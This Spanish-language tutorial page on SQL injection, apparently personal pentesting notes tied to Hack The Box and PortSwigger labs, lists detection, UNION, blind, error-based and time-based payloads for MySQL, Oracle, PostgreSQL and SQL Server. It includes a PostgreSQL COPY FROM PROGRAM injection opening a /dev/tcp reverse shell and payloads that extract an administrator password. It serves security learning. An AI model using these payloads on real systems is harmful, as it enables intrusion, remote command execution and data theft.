# SQLI

## Detectar SQLI

Existen varios payloads que podemos probar para detectar un SQLI:

* Comilla simple (') : Suele ser suficiente para detectarlo
* 2 comillas simples ('')
* 3 comillas simples (''') Puede servir para evadir algunos IPS
* Comilla doble (") pocas veces pero puede ocurrir
* Para cadenas de texto -> (%) o (\_) o (||) o (+)
* Para numérico -> (-0) (+0) (-1) (+1)

Hay que tener en cuenta que a la hora de detectarlo podemos probar en formularios, en la URL, en la petición (a través de Burpsuite, etc...) Lo más importante es intentar entender cómo está funcionando por detrás para poder inyectar el SQL de la forma más adecuada.

Sabremos que puede llegar a ser vulnerable por cualquier cambio que observemos:

* Mostrar error
* Cambios en HTML, CSS, Javascript...
* Tamaño diferente de respuesta
* Respuesta HTTP con código diferente
* Cambios de cabecera

### Detectar DBMS

Podemos utilizar algunos Payloads como el tipo de comentario o sentencias concretas:

* /\*! expresión \*/ -> Si se usa en MySQL se ignora el comentario con la exclamación
* LIMIT n -> Se usa en MYSQL
* TOP n -> Equivalente a LIMIT para SQL server
* rownum=n -> En oracle almacena el índice de cada fila de una tabla numerándola de 1 a N

## Error based

La más fácil de detectar ya que nos saltará un error a la hora de intentar inyectar el SQLI.

### POSTGRESQL

#### Ejecución remota de comandos

Con postgresql podemos realizar comandos dentro de la máquina objetivo y sacar el output o directamente establecernos una Reverse Shell.

En primer lugar creamos una tabla que será donde copiemos el output del comando que queramos usar, en este caso "whoami"

```
HOLA' ; DROP TABLE IF EXISTS prueba; CREATE TABLE prueba(data text); COPY prueba FROM PROGRAM 'whoami';--
```

Para ver dicho output lo que tendríamos que hacer es mostrar los datos dentro de la tabla prueba que hemos creado, el siguiente ejemplo es sacado del formulario de búsqueda de la máquina [Vaccine ](../../../HTB/vaccine.md)de Hack The Box:

```
HOLA' UNION SELECT NULL,NULL,NULL,*,NULL FROM prueba--
```

También podríamos sacar una reverse Shell directamente, tenemos que plantear que estamos realizando una ejecución de comandos y viendo el output, pero el comando se está ejecutando por lo que podemos hacer pruebas con las distintas formas de enviar una [reverse shell](../../../herramientas/shell-cheatsheet.md)

```
HOLA' ; DROP TABLE IF EXISTS prueba; CREATE TABLE prueba(data text); COPY prueba FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"';--
```

Más info en [https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)

## Union Select

Una vez hemos detectado la posible vulnerabilidad una forma de sacar los datos es a través de un Union Select. En primer lugar tenemos que averiguar el número de columnas:

```
-1' order by ?-- - #En Mysql donde '?' tiene que ser un número, el máximo número que te permite sin error es el número de columnas
-1' union select null, null, null-- - #Poniendo tantos null cómo columnas sin que de un error

#En oracle es importante el FROM (dual es una tabla por defecto) También podemos usar order by
-1' union select null, null, null from dual--
```

Una vez hemos detectado cuantas columnas tenemos que utilizar es el momento de determinar en cual puedo imprimir un string, simplemente cambiando null por una palabra "string":

```
-1' union select null,"string",null-- - #Mysql
-1' union select null,"string",null from dual-- #Oracle
```

Con esta información ya podemos empezar a enumerar la base de datos (En mysql):

```
#Los nombres de todas las bases de datos
' union select schema_name, null from information_schema.schemata-- -

#Podemos obtener todas las tablas o aquellas de bases de datos concretas
' union select table_name, null from information_schema.tables where table_schema='nombreBD'-- -

#A continuación columnas
' union select column_name, null from information_schema.columns where table_name='nombretabla' and table_schema='nombreBD'-- -

#Por último los datos
' union select CONCAT(columna1,':',columna2),null from nombretabla-- - 
```

En oracle:

```
#Obtener las tablas
' union select table_name, null from all_tables--

#Obtener las columnas
' union select column_name, null from all_tab_columns where table_name='nombretabla'--

#Obtener los datos
' union select columna1||':'||columna2, null from nombretabla--
```

## Blind Injection

Para encontrar este tipo de inyecciones tenemos que fijarnos si nos responde a ciertas preguntas de alguna forma. Un ejemplo para hacer esto sería el siguiente:

```
1' and 1=1-- #Sentencia correcta
1' and 1=2-- #Sentencia incorrecta
```

Buscamos dar una sentencia correcta y una incorrecta para buscar diferencias entre ambas, las diferencias se pueden dar en las cabeceras, en el código HTML o en cualquier detalle dentro de la respuesta que nos de el servidor. Una vez vemos dicha diferencia podemos empezar a hacer preguntas al servidor.

Para hacernos una idea tenemos que hacer preguntas de si o no, por ejemplo, ¿La primera letra del nombre de la base de datos es 'a'? Cómo sabemos la pequeña diferencia entre una sentencia correcta y una incorrecta podemos determinar la respuesta a la pregunta.

```
SUBSTR(nombrebd, 1, 1) #Oracle
SUBSTRING(nombrebd,1, 1) #Mysql, PostgreSQL, Microsoft
```

Tenéis ejemplo de cómo utilizar esta inyección en [el write-up de Portswigger](broken-reference).

Podéis por ejemplo saber qué base de datos trabaja por detrás, yo suelo hacerlo con el comando sleep:

```
' RLIKE sleep (5)-- - #Mysql
' and 1234=(select 1234 from pg_sleep(5))-- #PostgreSQL
```

Después para sacar la información es similar al resto de inyecciones, pero en este caso utilizando el substring que nos permite preguntar por cada letra de una cadena, un ejemplo de sintaxis en PostgreSQL:

```
'and (select substring(password,1,1) from users where username='administrator')='a'--
```

Estamos preguntando, ¿La primera letra de la contraseña del usuario administrador en la tabla Users es 'a'? podríamos seguir modificando '(password,234...,1)' '=b,c,d,e,f...' Para ir sacando cada una de las letras, de esta manera se puede llegar a dumpear toda la información de una base de datos. Tenéis un ejemplo de Script realizado para ello en [el write-up de Portswigger](broken-reference).

### Error Based con condicionales

En ocasiones puede ocurrir que lo que tengas es que provocar un error en base a un condicional, es decir, que la respuesta no te va a decir si es correcta o incorrecta tu pregunta, sino que únicamente va a mostrar un error en el caso de que haya un fallo en la sintaxis de la query.

Cuando nos encontramos con esto tenemos que utilizar los condicionales para conseguir la información, tenéis un ejemplo de esto en [el write-up de Portswigger](broken-reference).

```
#Oracle
' and  (select (case when (1=1) then null else to_char(1/0) end) from dual) is null--

#MySQL
' and select if(1=1, (select table_name from information_schema.tables),'a')

#Microsoft
' and select case when (1=1) then null else 1/0 end

#PostgreSQL
' and select case when (1=1) then null else cast(1/0 as text) end
```

Básicamente estás creando un condicional que provocará un error cuando la sentencia sea falsa.

#### ¿Muchas peticiones?

Es verdad que se hacen una gran cantidad de peticiones, pero puedes hacer otro tipo de búsquedas incluso que hagan un menor número.

Una manera de realizarlo podría ser preguntar por cada carácter en código ASCII y decir si es mayor o menor que un número de la tabla ASCII, de esta manera puedes acotar mucho más rápido y sacar en menos peticiones cada uno de los caracteres.&#x20;

También se puede conseguir realizando una búsqueda por porcentaje de aparición de ciertos caracteres en una lengua particular. Mi script de [SQLI Time Based](https://github.com/shanks-op/SQLItimebased) lo realiza de esa manera por ejemplo.

## Time Based

En primer lugar tenemos que detectarlo por ejemplo concatenando esperas de tiempo:

```
sleep (10) #Mysql
pg_sleep(10) #PostgreSQL
WAITFOR DELAY '0:0:10' #Microsoft
dbms_pipe.receive_message(('a'),10) #Oracle
```

## Practicar

* Máquinas "[SQLI de Portswigger](../../../portswigger/sql-injection.md)" de Portswigger \[Acceso 06/11/2021]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
